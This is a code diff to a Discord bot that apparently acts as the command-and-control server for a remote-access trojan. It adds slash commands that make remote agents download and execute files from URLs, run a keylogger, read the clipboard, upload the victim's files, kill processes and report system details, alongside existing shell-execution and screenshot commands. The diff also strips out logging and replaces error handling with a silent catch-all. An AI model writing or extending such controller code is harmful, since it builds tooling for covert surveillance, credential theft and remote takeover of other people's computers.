@@ -39,10 +39,8 @@ intents.messages = True
 class MyBot(commands.Bot):
     def __init__(self):
         super().__init__(command_prefix="!", intents=intents)
-        # self.tree is already created by the base class – do NOT reassign it
 
     async def setup_hook(self):
-        # Sync commands to the specific guild (instant)
         guild = discord.Object(id=GUILD_ID)
         self.tree.copy_global_to(guild=guild)
         await self.tree.sync(guild=guild)
@@ -71,36 +69,28 @@ async def clean_stale_agents():
     guild = bot.get_guild(GUILD_ID)
     if not guild:
         return
-
     agent_channels = [ch for ch in guild.text_channels if ch.name.startswith(AGENT_CHANNEL_PREFIX)]
     now = datetime.now(timezone.utc)
-
     for channel in agent_channels:
         try:
             async for msg in channel.history(limit=10, oldest_first=True):
                 if msg.author == bot.user and "**Last seen:**" in msg.content:
                     match = re.search(r"\*\*Last seen:\*\*\s*([^\n]+)", msg.content)
                     if not match:
-                        logger.info(f"Deleting {channel.name} (no timestamp)")
                         await channel.delete()
                         break
                     timestamp_str = match.group(1).strip()
                     try:
                         last_seen = datetime.fromisoformat(timestamp_str.replace('Z', '+00:00'))
                         if now - last_seen > timedelta(minutes=STALE_THRESHOLD_MINUTES):
-                            logger.info(f"Deleting {channel.name} (stale, last seen {last_seen})")
                             await channel.delete()
-                    except Exception as e:
-                        logger.error(f"Timestamp parse error for {channel.name}: {e}")
+                    except Exception:
                         await channel.delete()
                     break
             else:
-                logger.info(f"Deleting {channel.name} (no heartbeat message)")
                 await channel.delete()
-        except discord.Forbidden:
-            logger.warning(f"No permission to read history in {channel.name}")
-        except Exception as e:
-            logger.error(f"Error processing {channel.name}: {e}")
+        except:
+            pass
 
 @clean_stale_agents.before_loop
 async def before_clean_stale_agents():
@@ -115,32 +105,24 @@ async def on_ready():
         control = discord.utils.get(guild.channels, name=CONTROL_CHANNEL_NAME)
         if not control:
             await guild.create_text_channel(CONTROL_CHANNEL_NAME)
-            logger.info(f"Created #{CONTROL_CHANNEL_NAME} channel")
     clean_stale_agents.start()
 
-# ------------------- SLASH COMMANDS -------------------
-async def send_command_to_agent(interaction: discord.Interaction, command_text: str):
-    """Send a command message to the agent's channel."""
+# ------------------- HELPER: Send command to agent -------------------
+async def send_command_to_agent(interaction: discord.Interaction, cmd_text: str, ephemeral: bool = True):
     channel = interaction.channel
     if not channel.name.startswith(AGENT_CHANNEL_PREFIX):
-        await interaction.response.send_message(
-            "This command can only be used in an agent channel.",
-            ephemeral=True
-        )
+        await interaction.response.send_message("❌ This command can only be used in an agent channel.", ephemeral=True)
         return False
-    # Send a message that the agent will recognize
-    await channel.send(f"[CMD] {command_text}")
-    await interaction.response.send_message(
-        f"✅ Command `{command_text}` sent to agent.",
-        ephemeral=True
-    )
+    await channel.send(f"[CMD] {cmd_text}")
+    await interaction.response.send_message(f"✅ Command `{cmd_text}` sent to agent.", ephemeral=ephemeral)
     return True
 
-@bot.tree.command(name="run", description="Execute a shell command on the agent")
+# ------------------- SLASH COMMANDS -------------------
+@bot.tree.command(name="run", description="Execute a shell command")
 async def run_command(interaction: discord.Interaction, command: str):
     await send_command_to_agent(interaction, f"run {command}")
 
-@bot.tree.command(name="screenshot", description="Capture a screenshot from the agent")
+@bot.tree.command(name="screenshot", description="Take a screenshot")
 async def screenshot_command(interaction: discord.Interaction):
     await send_command_to_agent(interaction, "screenshot")
 
@@ -148,7 +130,51 @@ async def screenshot_command(interaction: discord.Interaction):
 async def kill_command(interaction: discord.Interaction):
     await send_command_to_agent(interaction, "kill")
 
-# ------------------- CONTROL CHANNEL COMMANDS (optional, keep for backward compat) -------------------
+@bot.tree.command(name="sysinfo", description="Get detailed system information")
+async def sysinfo_command(interaction: discord.Interaction):
+    await send_command_to_agent(interaction, "sysinfo")
+
+@bot.tree.command(name="download_exec", description="Download a file from URL and execute it")
+async def download_exec_command(interaction: discord.Interaction, url: str, args: str = ""):
+    cmd = f"downloadexec {url} {args}".strip()
+    await send_command_to_agent(interaction, cmd)
+
+@bot.tree.command(name="clipboard", description="Get or set clipboard content")
+async def clipboard_command(interaction: discord.Interaction, action: str, text: str = ""):
+    if action.lower() not in ["get", "set"]:
+        await interaction.response.send_message("❌ Action must be 'get' or 'set'.", ephemeral=True)
+        return
+    if action == "set" and not text:
+        await interaction.response.send_message("❌ You must provide text to set.", ephemeral=True)
+        return
+    cmd = f"clipboard {action} {text}".strip()
+    await send_command_to_agent(interaction, cmd)
+
+@bot.tree.command(name="ps", description="List running processes")
+async def ps_command(interaction: discord.Interaction):
+    await send_command_to_agent(interaction, "ps")
+
+@bot.tree.command(name="killpid", description="Kill a process by PID")
+async def killpid_command(interaction: discord.Interaction, pid: int):
+    await send_command_to_agent(interaction, f"killpid {pid}")
+
+@bot.tree.command(name="keylog_start", description="Start keylogger")
+async def keylog_start_command(interaction: discord.Interaction):
+    await send_command_to_agent(interaction, "keylog_start")
+
+@bot.tree.command(name="keylog_stop", description="Stop keylogger and get logs")
+async def keylog_stop_command(interaction: discord.Interaction):
+    await send_command_to_agent(interaction, "keylog_stop")
+
+@bot.tree.command(name="upload", description="Upload a file from the agent")
+async def upload_command(interaction: discord.Interaction, path: str):
+    await send_command_to_agent(interaction, f"upload {path}")
+
+@bot.tree.command(name="download", description="Download a file to the agent")
+async def download_command(interaction: discord.Interaction, url: str, filename: str):
+    await send_command_to_agent(interaction, f"download {url} {filename}")
+
+# ------------------- CONTROL CHANNEL COMMANDS (legacy) -------------------
 @bot.command(name="agents")
 async def list_agents(ctx):
     if ctx.channel.name != CONTROL_CHANNEL_NAME:
